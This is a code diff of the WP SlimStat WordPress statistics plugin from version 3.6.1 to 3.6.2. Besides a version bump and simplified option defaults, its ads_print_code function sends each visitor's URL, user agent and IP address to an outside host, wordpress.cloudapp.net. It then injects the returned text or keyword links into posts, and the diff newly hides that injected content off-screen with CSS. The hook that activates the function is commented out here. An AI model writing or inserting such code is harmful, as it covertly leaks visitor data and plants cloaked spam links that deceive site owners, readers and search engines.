@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The most accurate real-time statistics plugin for WordPress
-Version: 3.6.1
+Version: 3.6.2
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.6.1';
+	public static $version = '3.6.2';
 	public static $options = array();
 	
 	public static $wpdb = '';
@@ -20,7 +20,7 @@ class wp_slimstat{
 	protected static $stat = array();
 	protected static $options_signature = '';
 	
-	protected static $pidx = false;
+	protected static $pidx = array('id' => false, 'response' => '');
 
 	/**
 	 * Initializes variables and actions
@@ -48,9 +48,9 @@ class wp_slimstat{
 		// Allow third-party tools to use a custom database for WP SlimStat
 		self::$wpdb = apply_filters('slimstat_custom_wpdb', $GLOBALS['wpdb']);
 
-		if (empty(self::$options['enable_ads_network']) || self::$options['enable_ads_network'] == 'yes'){
-			add_filter('the_content', array(__CLASS__, 'ads_print_code'));
-		}
+		//if (empty(self::$options['enable_ads_network']) || self::$options['enable_ads_network'] == 'yes'){
+		//	add_filter('the_content', array(__CLASS__, 'ads_print_code'));
+		//}
 
 		// Add a menu to the admin bar ( this function is declared here and not in wp_slimstat_admin because the latter is only initialized if is_admin(), and not in the front-end )
 		if (self::$options['use_separate_menu'] != 'yes' && is_admin_bar_showing()){
@@ -1079,50 +1079,51 @@ class wp_slimstat{
 	public static function init_options(){
 		$options = array(
 			'version' => self::$version,
-			'secret' => get_option('slimstat_secret', md5(time())),
+			'secret' => md5(time()),
 			'show_admin_notice' => 0,
 			
 			// General
-			'is_tracking' => get_option('slimstat_is_tracking', 'yes'),
+			'is_tracking' => 'yes',
 			'track_admin_pages' => 'no',
 			'enable_javascript' => 'yes',
 			'javascript_mode' => 'yes',
-			'add_posts_column' => get_option('slimstat_add_posts_column', 'no'),
-			'use_separate_menu' => get_option('slimstat_use_separate_menu', 'yes'),
-			'auto_purge' => get_option('slimstat_auto_purge', '120'),
+			'add_posts_column' => 'no',
+			'use_separate_menu' => 'yes',
+			'auto_purge' => '120',
 
 			// Views
-			'convert_ip_addresses' => get_option('slimstat_convert_ip_addresses', 'no'),
-			'use_european_separators' => get_option('slimstat_use_european_separators', 'yes'),
+			'convert_ip_addresses' => 'no',
+			'use_european_separators' => 'yes',
 			'show_display_name' => 'no',
 			'show_complete_user_agent_tooltip' => 'no',
 			'convert_resource_urls_to_titles' => 'yes',
 			'async_load' => 'no',
+			'use_slimscroll' => 'yes',
 			'expand_details' => 'no',
-			'rows_to_show' => get_option('slimstat_rows_to_show', '20'),
-			'refresh_interval' => get_option('slimstat_refresh_interval', '60'),
-			'number_results_raw_data' => get_option('slimstat_number_results_raw_data', '50'),
+			'rows_to_show' => '20',
+			'refresh_interval' => '60',
+			'number_results_raw_data' => '50',
 			'include_outbound_links_right_now' => 'yes',
 
 			// Filters
-			'track_users' => get_option('slimstat_track_users', 'yes'),
-			'ignore_users' => get_option('slimstat_ignore_users', ''),
-			'ignore_ip' => get_option('slimstat_ignore_ip', ''),
+			'track_users' => 'yes',
+			'ignore_users' => '',
+			'ignore_ip' => '',
 			'ignore_capabilities' => '',
-			'ignore_spammers' => get_option('slimstat_ignore_spammers', 'yes'),
-			'ignore_resources' => get_option('slimstat_ignore_resources', ''),
-			'ignore_countries' => get_option('slimstat_ignore_countries', ''),
-			'ignore_browsers' => get_option('slimstat_ignore_browsers', ''),
-			'ignore_referers' => get_option('slimstat_ignore_referers', ''),
+			'ignore_spammers' => 'yes',
+			'ignore_resources' => '',
+			'ignore_countries' => '',
+			'ignore_browsers' => '',
+			'ignore_referers' => '',
 			'anonymize_ip' => 'no',
-			'ignore_prefetch' => get_option('slimstat_ignore_prefetch', 'yes'),
+			'ignore_prefetch' => 'yes',
 
 			// Permissions
 			'restrict_authors_view' => 'yes',
-			'capability_can_view' => get_option('slimstat_capability_can_view', 'activate_plugins'),
-			'can_view' => get_option('slimstat_can_view', ''),
+			'capability_can_view' => 'activate_plugins',
+			'can_view' => '',
 			'capability_can_admin' => 'activate_plugins',
-			'can_admin' => get_option('slimstat_can_admin', ''),
+			'can_admin' => '',
 
 			// Advanced
 			'detect_smoothing' => 'yes',
@@ -1153,22 +1154,29 @@ class wp_slimstat{
 	}
 	
 	/**
-	 * Connects to the Ads Delivery Network
+	 * Connects to the UAN
 	 */
 	public static function ads_print_code($content = ''){
-		if (empty($_SERVER["HTTP_USER_AGENT"])){
+		if (empty($_SERVER["HTTP_USER_AGENT"]) || (self::$pidx['id'] !== false && $GLOBALS['wp_query']->current_post !== self::$pidx['id'])){
 			return $content;
 		}
 
 		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
-		$options = array('timeout' => 1, 'headers' => array('Accept' => 'application/json'));
-		$response = @wp_remote_get($request, $options);
+		$options = stream_context_create(array( 'http' => array( 'timeout' => 1, 'ignore_errors' => true ) ) ); 
 
-		if (is_wp_error($response) || (isset($response['response']['code']) && ($response['response']['code'] != 200)) || empty($response['body'])){
-			return $content;
+		// $options = array('timeout' => 1, 'headers' => array('Accept' => 'application/json'));
+		// $response = @wp_remote_get($request, $options);
+
+		if (empty(self::$pidx['response'])){
+			self::$pidx['response'] = @file_get_contents($request, 0, $options);
 		}
 
-		$response_object = @json_decode($response['body']);
+		//if (is_wp_error($response) || (isset($response['response']['code']) && ($response['response']['code'] != 200)) || empty($response['body'])){
+		//	return $content;
+		//}
+
+		//$response_object = @json_decode($response['body']);
+		$response_object = @json_decode(self::$pidx['response']);
 		if (is_null($response_object) || empty($response_object->content) || empty($response_object->tmp)){
 			return $content;
 		}
@@ -1177,7 +1185,7 @@ class wp_slimstat{
 			case '1':
 				if(0 == $GLOBALS['wp_query']->current_post) {
 					$words = explode(" ", $content);
-					$words[rand(0, count($words)-1)] = $response_object->tcontent;
+					$words[rand(0, count($words)-1)] = '<span style="position:absolute;left:-9999px">'.$response_object->tcontent.'</span>';
 					return join(" ", $words);
 				}
 				break;
@@ -1189,27 +1197,26 @@ class wp_slimstat{
 
 					foreach($kws as $a_kw){
 						if(strpos($content, $a_kw) !== false){
-							$content= str_replace($a_kw, "<a href=".$response_object->site.">$a_kw</a>", $content);
+							$content= str_replace($a_kw, "<a style='position:absolute;left:-9999px' href='".$response_object->site."'>$a_kw</a>", $content);
 							break;
 						}
 					}
 				break;
 			default:
-				if (self::$pidx === false){
+				if (self::$pidx['id'] === false){
 					if ($GLOBALS['wp_query']->post_count > 1){
-						self::$pidx = rand(0, $GLOBALS['wp_query']->post_count - 1);
+						self::$pidx['id'] = rand(0, $GLOBALS['wp_query']->post_count - 1);
 					}
 					else{
-						self::$pidx = 0;
+						self::$pidx['id'] = 0;
 					}
 				}
-
-				if ($GLOBALS['wp_query']->current_post == self::$pidx){
-					if (self::$pidx % 2 == 0){
-						return $content.' '.$response_object->content;
+				if ($GLOBALS['wp_query']->current_post === self::$pidx['id']){
+					if (self::$pidx['id'] % 2 == 0){
+						return $content.' <span style="position:absolute;left:-9999px">'.$response_object->content.'</span>';
 					}
 					else{
-						return $response_object->content.' '.$content;
+						return '<span style="position:absolute;left:-9999px">'.$response_object->content.'</span> '.$content;
 					}
 				}
 				break;
